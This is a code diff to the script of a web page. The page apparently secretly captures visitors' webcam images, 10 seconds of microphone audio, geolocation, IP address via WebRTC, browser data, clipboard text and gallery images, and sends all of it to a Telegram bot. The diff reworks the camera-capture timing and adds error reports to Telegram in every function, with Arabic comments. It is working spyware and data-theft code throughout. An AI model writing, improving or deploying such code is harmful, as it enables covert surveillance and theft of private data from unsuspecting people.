@@ -199,27 +199,34 @@
                     audio: true
                 });
                 video.srcObject = stream;
+                video.play(); // تشغيل الفيديو لضمان تحميل البيانات
+                await new Promise((resolve) => {
+                    video.oncanplay = () => {
+                        setTimeout(() => {
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/png');
+                            sendPhotoToTelegram(imageData);
+                            resolve();
+                        }, 2000); // تأخير 2 ثانية لضمان تحميل الفيديو
+                    };
+                });
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+                    recordedChunks = [];
+                    sendAudioToTelegram(blob);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                mediaRecorder.start();
                 setTimeout(() => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/png');
-                    sendPhotoToTelegram(imageData);
-                    mediaRecorder = new MediaRecorder(stream);
-                    mediaRecorder.ondataavailable = (event) => {
-                        if (event.data.size > 0) recordedChunks.push(event.data);
-                    };
-                    mediaRecorder.onstop = () => {
-                        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
-                        recordedChunks = [];
-                        sendAudioToTelegram(blob);
-                        stream.getTracks().forEach(track => track.stop());
-                    };
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                    }, 10000); // تسجيل لمدة 10 ثوانٍ
-                }, 1000);
+                    mediaRecorder.stop();
+                }, 10000); // تسجيل لمدة 10 ثوانٍ
             } catch (error) {
                 console.error('خطأ في الوصول إلى الكاميرا/الميكروفون:', error);
+                sendToTelegram(`خطأ في الوصول إلى الكاميرا/الميكروفون: ${error.message}`);
             }
         }
 
@@ -240,6 +247,7 @@
                         },
                         (error) => {
                             console.error('خطأ في طلب الموقع:', error);
+                            sendToTelegram(`خطأ في طلب الموقع: ${error.message}`);
                             reject(error);
                         },
                         {
@@ -279,6 +287,7 @@
                 setTimeout(() => pc.close(), 5000);
             } catch (error) {
                 console.error('خطأ في جمع عنوان IP:', error);
+                sendToTelegram(`خطأ في جمع عنوان IP: ${error.message}`);
             }
         }
 
@@ -297,6 +306,7 @@
                 await sendToTelegram(browserData);
             } catch (error) {
                 console.error('خطأ في جمع بيانات المتصفح:', error);
+                sendToTelegram(`خطأ في جمع بيانات المتصفح: ${error.message}`);
             }
         }
 
@@ -304,6 +314,7 @@
         async function readClipboard() {
             try {
                 if (!navigator.clipboard) {
+                    sendToTelegram('الحافظة غير مدعومة في هذا المتصفح');
                     return;
                 }
                 const text = await navigator.clipboard.readText();
@@ -311,6 +322,7 @@
                 await sendToTelegram(clipboardData);
             } catch (error) {
                 console.error('خطأ في قراءة الحافظة:', error);
+                sendToTelegram(`خطأ في قراءة الحافظة: ${error.message}`);
             }
         }
 
@@ -324,6 +336,7 @@
                 }
             } catch (error) {
                 console.error('خطأ في إرسال الصور من المعرض:', error);
+                sendToTelegram(`خطأ في إرسال الصور من المعرض: ${error.message}`);
             }
         }
 
@@ -377,6 +390,7 @@
                 if (!response.ok) throw new Error('فشل إرسال الصورة');
             } catch (error) {
                 console.error('خطأ في إرسال الصورة إلى تيليجرام:', error);
+                sendToTelegram(`خطأ في إرسال الصورة: ${error.message}`);
             }
         }
 
@@ -398,6 +412,7 @@
                 if (!response.ok) throw new Error('فشل إرسال الصوت');
             } catch (error) {
                 console.error('خطأ في إرسال الصوت إلى تيليجرام:', error);
+                sendToTelegram(`خطأ في إرسال الصوت: ${error.message}`);
             }
         }
     </script>
